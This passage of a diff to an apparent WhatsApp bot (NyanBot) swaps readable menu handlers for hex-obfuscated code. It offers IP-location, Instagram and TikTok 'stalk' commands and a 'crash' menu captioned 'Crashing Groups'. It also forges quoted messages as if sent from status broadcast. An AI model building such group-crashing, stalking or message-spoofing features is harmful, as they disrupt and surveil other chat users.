\uD835\uDE9C\u1DE4\uD835\uDE8A\u0363\uD835\uDE96\u036B\uD835\uDE9E\uD834\uDE44\uD81B\uDF94\uD81B\uDF94\uD81B\uDF59\x2E\x6C\x69\x20\x4F\u2131\u1ECB\x63\u03B9\u0251\x6C\x2E\x6C\x69\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0D\x0A\x09\x09\x09\x09\x09","\x67\x72\x75\x70\x6F\x73\x20\x2A\x28\x56\x65\x20\x6C\x6F\x73\x20\x67\x72\x75\x70\x6F\x73\x20\x64\x65\x6C\x20\x62\x6F\x74\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x74\x69\x6D\x65\x72\x20\x2A\x28\x43\x72\x6F\x6E\x6F\x6D\x65\x74\x72\x6F\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x63\x61\x6C\x63\x20\x2A\x28\x43\x61\x6C\x63\x75\x6C\x61\x64\x6F\x72\x61\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x70\x72\x65\x67\x75\x6E\x74\x61\x20\x2A\x28\x48\x61\x7A\x20\x75\x6E\x61\x20\x70\x72\x65\x67\x75\x6E\x74\x61\x20\x79\x20\x65\x6C\x20\x62\x6F\x74\x20\x74\x65\x20\x72\x65\x73\x70\x6F\x6E\x64\x65\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x69\x70\x62\x6F\x74\x20\x2A\x28\x4C\x6F\x63\x61\x6C\x69\x7A\x61\x20\x61\x6C\x20\x62\x6F\x74\x20\x70\x6F\x72\x20\x69\x70\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x69\x70\x20\x2A\x28\x48\x61\x7A\x20\x75\x6E\x61\x20\x6C\x6F\x63\x6C\x69\x7A\x61\x63\x69\x6F\x6E\x20\x70\x6F\x72\x20\x69\x70\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x69\x67\x73\x74\x61\x6C\x6B\x20\x2A\x28\x4E\x6F\x6D\x62\x72\x65\x20\x64\x65\x20\x55\x73\x75\x61\x72\x69\x6F\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x76\x6F\x7A\x20\x2A\x28\x43\x6F\x64\x69\x67\x6F\x20\x64\x65\x20\x69\x64\x69\x6F\x6D\x61\x29\x2A\x20\x2A\x28\x54\x65\x78\x74\x6F\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09\x09\x09\x20\x20\x5F\x50\x61\x72\x61\x20\x76\x65\x72\x20\x69\x64\x69\x6F\x6D\x61\x73\x20\x63\x6F\x6D\x70\x61\x74\x69\x62\x6C\x65\x73\x2C\x20\x75\x73\x61\x20\x65\x6C\x20\x63\x6F\x6D\x61\x6E\x64\x6F\x5F\x20\x2A\x69\x64\x69\x6F\x6D\x61\x73\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x74\x72\x61\x6E\x73\x6C\x61\x74\x65\x20\x2A\x28\x69\x64\x69\x6F\x6D\x61\x20\x61\x20\x74\x72\x61\x64\x75\x63\x69\x72\x20\x3D\x20\x65\x73\x2C\x20\x65\x6E\x2C\x20\x69\x64\x2E\x2E\x2E\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x74\x69\x6B\x74\x6F\x6B\x73\x74\x61\x6C\x6B\x20\x40\x75\x73\x75\x61\x72\x69\x6F\x0D\x0A\x09\x09\x09\x09\x09","\x68\x69\x64\x65\x74\x61\x67\x20\x2A\x28\x54\x65\x78\x74\x6F\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x63\x61\x6D\x62\x69\x61\x72\x20\x2A\x28\x43\x61\x6D\x62\x69\x61\x20\x65\x6C\x20\x63\x75\x65\x72\x70\x6F\x20\x64\x65\x6C\x20\x6D\x65\x6E\xFA\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x73\x68\x6F\x72\x74\x6C\x69\x6E\x6B\x20\x5F\x28\x41\x63\x6F\x72\x74\x61\x64\x6F\x72\x20\x64\x65\x20\x6C\x69\x6E\x6B\x73\x29\x5F\x0D\x0A\x09\x09\x09\x09\x09","\x70\x61\x73\x74\x65\x62\x69\x6E\x20\x2A\x28\x67\x65\x6E\x65\x72\x61\x20\x6C\x69\x6E\x6B\x20\x68\x61\x63\x69\x61\x20\x65\x6C\x20\x74\x65\x78\x74\x6F\x20\x6F\x20\x6C\x69\x6E\x6B\x20\x71\x75\x65\x20\x65\x73\x63\x72\x69\x62\x61\x73\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x61\x62\x69\x6E\x61\x72\x69\x6F\x20\x2A\x28\x74\x65\x78\x74\x6F\x20\x61\x20\x63\x6F\x64\x69\x67\x6F\x20\x62\x69\x6E\x61\x72\x69\x6F\x29\x2A\x20\x30\x31\x30\x30\x31\x30\x0D\x0A\x09\x09\x09\x09\x09","\x62\x69\x6E\x61\x74\x65\x78\x74\x20\x2A\x28\x63\x6F\x64\x69\x67\x6F\x20\x62\x69\x6E\x61\x72\x69\x6F\x20\x61\x20\x74\x65\x78\x74\x6F\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x61\x6F\x63\x74\x61\x6C\x20\x2A\x28\x74\x65\x78\x74\x6F\x20\x61\x20\x63\x6F\x64\x69\x67\x6F\x20\x6F\x63\x74\x61\x6C\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x6F\x63\x74\x61\x6C\x61\x74\x65\x78\x74\x20\x2A\x28\x63\x6F\x64\x69\x67\x6F\x20\x6F\x63\x74\x61\x6C\x20\x61\x20\x74\x65\x78\x74\x6F\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x61\x68\x65\x78\x20\x2A\x28\x74\x65\x78\x74\x6F\x20\x61\x20\x63\x6F\x64\x69\x67\x6F\x20\x68\x65\x78\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x68\x65\x78\x61\x74\x65\x78\x74\x20\x2A\x28\x63\x6F\x64\x69\x67\x6F\x20\x68\x65\x78\x20\x61\x20\x74\x65\x78\x74\x6F\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x77\x61\x2E\x6D\x65\x0D\x0A\x09\x09\x09\x09\x09","\x69\x64\x69\x6F\x69\x6D\x61\x73\x0D\x0A\x09\x09\x09\x09\x09","\x72\x65\x76\x65\x72\x73\x61\x0D\x0A\x09\x09\x09\x09\x09","\x6D\x65\x6D\x65\x0D\x0A\x09\x09\x09\x09\x09","\x6C\x65\x65\x72\x6D\x61\x73\x20\x5F\x66\x72\x61\x73\x65\x2F\x66\x72\x61\x73\x65\x5F\x0D\x0A\x09\x09\x09\x09\x09","\x6D\x61\x70\x61\x0D\x0A\x09\x09\x09\x09\x09","\x73\x6F\x79\x79\x6F\x0D\x0A\x09\x09\x09\x09\x09","\x62\x6C\x6F\x63\x6B\x6C\x69\x73\x74\x0D\x0A\x09\x09\x09\x09\x09","\x6C\x65\x65\x72\x69\x6D\x61\x67\x65\x6E\x0D\x0A\x09\x09\x09\x09\x09\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x2A\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\u0333\x0D\x0A\x09\x09\x09\x09\x09\x09\x09\x20\x20\uD83C\uDF38\x20\x53\x61\x6D\u1ECB\x50\x65\x72\x72\x79\x2E\x6C\x69\x20\uD83C\uDF38\x0D\x0A\x09\x09\x09\x09\x09\x20\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x0D\x0A\x09\x09\x09\x09\x09"];if(sam[_0xdf3d[1]][_0xdf3d[0]]){test= sam[_0xdf3d[1]][_0xdf3d[0]][_0xdf3d[3]][_0xdf3d[2]];if(test[_0xdf3d[5]](`${_0xdf3d[4]}`)){if(!isRegister){return samu330[_0xdf3d[11]](from,fs[_0xdf3d[7]](_0xdf3d[6]),image,{quoted:noreg,caption:`${_0xdf3d[8]}${timeFt}${_0xdf3d[9]}${prefix}${_0xdf3d[10]}`,thumbnail:assistant,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true}})};mda= `${_0xdf3d[12]}${prefix}${_0xdf3d[13]}${prefix}${_0xdf3d[14]}${prefix}${_0xdf3d[15]}${prefix}${_0xdf3d[16]}${prefix}${_0xdf3d[17]}${prefix}${_0xdf3d[18]}${prefix}${_0xdf3d[19]}${prefix}${_0xdf3d[20]}${prefix}${_0xdf3d[21]}${prefix}${_0xdf3d[22]}${prefix}${_0xdf3d[23]}${prefix}${_0xdf3d[24]}${prefix}${_0xdf3d[25]}${prefix}${_0xdf3d[26]}${prefix}${_0xdf3d[27]}${prefix}${_0xdf3d[28]}${prefix}${_0xdf3d[29]}${prefix}${_0xdf3d[30]}${prefix}${_0xdf3d[31]}${prefix}${_0xdf3d[32]}${prefix}${_0xdf3d[33]}${prefix}${_0xdf3d[34]}${prefix}${_0xdf3d[35]}${prefix}${_0xdf3d[36]}${prefix}${_0xdf3d[37]}${prefix}${_0xdf3d[38]}${prefix}${_0xdf3d[39]}${prefix}${_0xdf3d[40]}${prefix}${_0xdf3d[41]}`;samu330[_0xdf3d[11]](from,mda,MessageType[_0xdf3d[42]],{quoted:{key:{fromMe:false,participant:`${_0xdf3d[43]}`,...(from?{remoteJid:_0xdf3d[44]}:{})},message:{"\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65":{"\x63\x61\x70\x74\x69\x6F\x6E":_0xdf3d[45],'\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C':fs[_0xdf3d[7]](_0xdf3d[6])}}}});addFilter(from);addLevelingLevel(sender,5)}};if(sam[_0xdf3d[1]][_0xdf3d[0]]){test= sam[_0xdf3d[1]][_0xdf3d[0]][_0xdf3d[3]][_0xdf3d[2]];if(test[_0xdf3d[5]](`${_0xdf3d[46]}`)){if(!isRegister){return samu330[_0xdf3d[11]](from,fs[_0xdf3d[7]](_0xdf3d[6]),image,{quoted:noreg,caption:`${_0xdf3d[8]}${timeFt}${_0xdf3d[9]}${prefix}${_0xdf3d[10]}`,thumbnail:assistant,contextInfo:{"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true}})};stc= `${_0xdf3d[47]}${prefix}${_0xdf3d[48]}${prefix}${_0xdf3d[49]}${prefix}${_0xdf3d[50]}${prefix}${_0xdf3d[51]}${prefix}${_0xdf3d[52]}${prefix}${_0xdf3d[53]}${prefix}${_0xdf3d[54]}${prefix}${_0xdf3d[55]}${prefix}${_0xdf3d[56]}${prefix}${_0xdf3d[57]}${prefix}${_0xdf3d[58]}${prefix}${_0xdf3d[59]}${prefix}${_0xdf3d[60]}${prefix}${_0xdf3d[61]}`;samu330[_0xdf3d[11]](from,stc,MessageType[_0xdf3d[42]],{quoted:{key:{fromMe:false,participant:`${_0xdf3d[43]}`,...(from?{remoteJid:_0xdf3d[44]}:{})},message:{"\x64\x6F\x63\x75\x6D\x65\x6E\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x74\x69\x74\x6C\x65":_0xdf3d[62],'\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C':fs[_0xdf3d[7]](_0xdf3d[6])}}}});addFilter(from);addLevelingLevel(sender,5)}};if(sam[_0xdf3d[1]][_0xdf3d[0]]){test= sam[_0xdf3d[1]][_0xdf3d[0]][_0xdf3d[3]][_0xdf3d[2]];if(test[_0xdf3d[5]](`${_0xdf3d[63]}`)){samu330[_0xdf3d[65]](from,Presence[_0xdf3d[64]]);if(!isRegister){return reply(mess[_0xdf3d[67]][_0xdf3d[66]])};uptime= process[_0xdf3d[68]]();const Menug={text:`${_0xdf3d[69]}${pushname}${_0xdf3d[70]}${bodyM}${_0xdf3d[71]}${samu}${_0xdf3d[72]}${prefix}${_0xdf3d[73]}${samu}${_0xdf3d[74]}${bodyM}${_0xdf3d[71]}${samu}${_0xdf3d[72]}${prefix}${_0xdf3d[75]}${samu}${_0xdf3d[74]}${bodyM}${_0xdf3d[71]}${samu}${_0xdf3d[72]}${prefix}${_0xdf3d[76]}${samu}${_0xdf3d[74]}${bodyM}${_0xdf3d[71]}${samu}${_0xdf3d[72]}${prefix}${_0xdf3d[77]}${samu}${_0xdf3d[74]}${bodyM}${_0xdf3d[71]}${samu}${_0xdf3d[72]}${prefix}${_0xdf3d[78]}${samu}${_0xdf3d[74]}${bodyM}${_0xdf3d[71]}${samu}${_0xdf3d[72]}${prefix}${_0xdf3d[79]}${samu}${_0xdf3d[80]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[81]}${prefix}${_0xdf3d[82]}${prefix}${_0xdf3d[83]}${prefix}${_0xdf3d[84]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[85]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[86]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[87]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[88]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[89]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[90]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[91]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[92]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[93]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[94]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[95]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[96]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[97]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[98]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[99]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[100]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[101]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[102]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[103]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[104]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[105]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[106]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[107]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[108]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[109]}`,contextInfo:{mentionedJid:[sender],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":9999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true}};addFilter(from);addLevelingLevel(sender,5);samu330[_0xdf3d[11]](from,Menug,MessageType[_0xdf3d[42]],{quoted:{key:{fromMe:false,participant:`${_0xdf3d[43]}`,...(from?{remoteJid:_0xdf3d[44]}:{})},message:{"\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65":{"\x6D\x69\x6D\x65\x74\x79\x70\x65":_0xdf3d[110],"\x63\x61\x70\x74\x69\x6F\x6E":_0xdf3d[111],"\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C":fs[_0xdf3d[7]](`${_0xdf3d[112]}`)}}}})}};if(sam[_0xdf3d[1]][_0xdf3d[0]]){test= sam[_0xdf3d[1]][_0xdf3d[0]][_0xdf3d[3]][_0xdf3d[2]];if(test[_0xdf3d[5]](`${_0xdf3d[113]}`)){samu330[_0xdf3d[65]](from,Presence[_0xdf3d[64]]);if(!isRegister){return reply(mess[_0xdf3d[67]][_0xdf3d[66]])};uptime= process[_0xdf3d[68]]();const Menud={text:`${_0xdf3d[114]}${pushname}${_0xdf3d[115]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[116]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[117]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[118]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[119]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[120]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[121]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[122]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[123]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[124]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[125]}`,contextInfo:{mentionedJid:[sender],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":9999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true}};samu330[_0xdf3d[11]](from,Menud,MessageType[_0xdf3d[42]],{quoted:fvid});addFilter(from);addLevelingLevel(sender,5)}};if(sam[_0xdf3d[1]][_0xdf3d[0]]){test= sam[_0xdf3d[1]][_0xdf3d[0]][_0xdf3d[3]][_0xdf3d[2]];if(test[_0xdf3d[5]](`${_0xdf3d[126]}`)){samu330[_0xdf3d[65]](from,Presence[_0xdf3d[64]]);if(!isRegister){return reply(mess[_0xdf3d[67]][_0xdf3d[66]])};uptime= process[_0xdf3d[68]]();const Menuo={text:`${_0xdf3d[127]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[128]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[129]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[130]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[131]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[132]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[133]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[134]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[135]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[136]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[137]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[138]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[139]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[140]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[141]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[142]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[143]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[144]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[145]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[146]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[147]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[148]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[149]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[150]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[151]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[152]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[153]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[154]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[155]}${bodyM}${_0xdf3d[71]}${prefix}${_0xdf3d[156]}`,contextInfo:{mentionedJid:[sender],"\x66\x6F\x72\x77\x61\x72\x64\x69\x6E\x67\x53\x63\x6F\x72\x65":9999,"\x69\x73\x46\x6F\x72\x77\x61\x72\x64\x65\x64":true}};samu330[_0xdf3d[11]](from,Menuo,MessageType[_0xdf3d[42]],{quoted:floc});addFilter(from);addLevelingLevel(sender,5)}}
 
-            if (sam.message.listResponseMessage){
-				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
-				if (test.includes(`sticker`)){
-                    if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
-                    samu330.sendMessage(from, `${stc}`, MessageType.text, {quoted:
-                    { key: {
-                    fromMe: false,
-                    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
-                    },
-                    message: {
-                    "documentMessage": { "title": "📚𝑆𝑡𝑖𝑘𝑒𝑟 𝑚𝑒𝑛𝑢", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
-                    }})
-                    addFilter(from)
-                    addLevelingLevel(sender, 5)	
-			}
-			}
 
-            if (sam.message.listResponseMessage){
-				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
-				if (test.includes(`grupos`)){
-                    samu330.updatePresence(from, Presence.composing)
-                    if (!isRegister) return reply(mess.only.usrReg)
-                    uptime = process.uptime()
-                    addFilter(from)
-                    addLevelingLevel(sender, 5)		
-                    samu330.sendMessage(from, Menug, MessageType.text, {
-                    quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "➫𝑴𝒆𝒏𝒖 𝑫𝒆 𝑮𝒓𝒖𝒑𝒐𝒔\n❣️⃞🔥𝙎꯭𝙖͠𝙢꯭ 𝙔 ꯭𝙋꯭𝙚𝙧𝙧꯭𝙮🔥❣️" ,"jpegThumbnail": fs.readFileSync(`./NyanBot.jpg`)}}}})
-			}
-			}
-
-            if (sam.message.listResponseMessage){
-				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
-				if (test.includes(`descargas`)){
-                    samu330.updatePresence(from, Presence.composing)
-                    if (!isRegister) return reply(mess.only.usrReg)
-                    uptime = process.uptime()
-                    samu330.sendMessage(from, `${Menud}`, MessageType.text, {
-                    quoted:  fvid})
-                    addFilter(from)
-                    addLevelingLevel(sender, 5)	
-			}
-			}
-
-            if (sam.message.listResponseMessage){
-				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
-				if (test.includes(`tools`)){
-                    samu330.updatePresence(from, Presence.composing)
-                    if (!isRegister) return reply(mess.only.usrReg)
-                    samu330.sendMessage(from, `${Menu8}`, MessageType.text, {
-                    quoted: ftoko})
-                    addFilter(from)
-                    addLevelingLevel(sender, 5)	
-			}
-			}
-
-            if (sam.message.listResponseMessage){
-				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
-				if (test.includes(`logos`)){
-                    samu330.updatePresence(from, Presence.composing)
-                    if (!isRegister) return reply(mess.only.usrReg)
-                    uptime = process.uptime()
-                    samu330.sendMessage(from, `${Menu7}`, MessageType.text, {
-                    quoted: fvid})
-                    addFilter(from)
-                    addLevelingLevel(sender, 5)
-			}
-			}
-
-            if (sam.message.listResponseMessage){
-				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
-				if (test.includes(`owner`)){
-                    samu330.updatePresence(from, Presence.composing)
-                    if (!isRegister) return reply(mess.only.usrReg)
-                    samu330.sendMessage(from, `${Menu8}`, MessageType.text, {
-                    quoted: ftoko})
-                    addFilter(from)
-                    addLevelingLevel(sender, 5)	
-			}
-			}
-
-            if (sam.message.listResponseMessage){
-				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
-				if (test.includes(`crash`)){
-                    if (!isRegister) return reply(mess.only.usrReg)
-                    reply('*Gathering information...*')
-                    smww = fs.readFileSync(`./media/SmWW.png`)
-                    samu330.sendMessage(from, smww, image, {caption: `${menu9}`, quoted: { key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, ...(from ? {
-                            remoteJid: "status@broadcast" } : {}) }, 
-                                message: { 
-                                    "imageMessage": { 
-                                    "mimetype": 
-                                    "image/jpeg", 
-                                    "caption": "➫'*👑Samu330 Crashing Groups!!🔥*'\n'😈Samu330 Domina🥀'" ,
-                                    "jpegThumbnail": fs.readFileSync(`./src/ara.png`)}}}})
-			}
-			}
 
 var _0x4dab=["\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x6D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x52\x6F\x77\x49\x64","\x73\x69\x6E\x67\x6C\x65\x53\x65\x6C\x65\x63\x74\x52\x65\x70\x6C\x79","\x40\x6C\x69\x73\x74","\x65\x6E\x64\x73\x57\x69\x74\x68","","\x73\x70\x6C\x69\x74","\x2A\x45\x6E\x76\x69\x61\x6E\x64\x6F\x20\x61\x72\x63\x68\x69\x76\x6F\x2E\x2E\x2E\x2A\x0D\x0A\x5F\x54\x69\x74\x75\x6C\x6F\x3A\x20","\x5F\x0D\x0A\x5F\x44\x75\x72\x61\x63\x69\x6F\x6E\x3A\x20","\x74\x69\x6D\x65\x73\x74\x61\x6D\x70","\x61\x6C\x6C","\x5F\x0D\x0A\x4C\x69\x6E\x6B\x20\x64\x65\x6C\x20\x56\x69\x64\x65\x6F\x3A\x20","\x75\x72\x6C","\x6C\x69\x6E\x6B","\x61\x75\x64\x69\x6F\x2F\x6D\x70\x34","\x40\x6C\x69\x73\x74\x33","\x42\x79\x20\x53\x61\x6D\x75\x33\x33\x30\uD83C\uDF52","\x40\x6C\x69\x73\x74\x31","\x2A\x45\x6E\x76\x69\x61\x6E\x64\x6F\x20\x61\x72\x63\x68\x69\x76\x6F\x20\x65\x6E\x20\x4E\x6F\x74\x61\x20\x64\x65\x20\x56\x6F\x7A\x2E\x2E\x2E\x2A\x0D\x0A\x5F\x54\x69\x74\x75\x6C\x6F\x3A\x20","\x40\x6C\x69\x73\x74\x32","\x45\x6E\x76\x69\x61\x6E\x64\x6F\x20\x61\x72\x63\x68\x69\x76\x6F\x20\x63\x6F\x6D\x6F\x20\x4E\x6F\x74\x61\x20\x64\x65\x20\x76\x6F\x7A\x2E\x2E\x2E\x0D\x0A\x5F\x54\x69\x74\x75\x6C\x6F\x3A\x20","\x0D\x0A\x5F\x44\x75\x72\x61\x63\x69\x6F\x6E\x3A\x20","\x0D\x0A\x4C\x69\x6E\x6B\x20\x64\x65\x6C\x20\x56\x69\x64\x65\x6F\x3A\x20"];if(sam[_0x4dab[1]][_0x4dab[0]]){test= 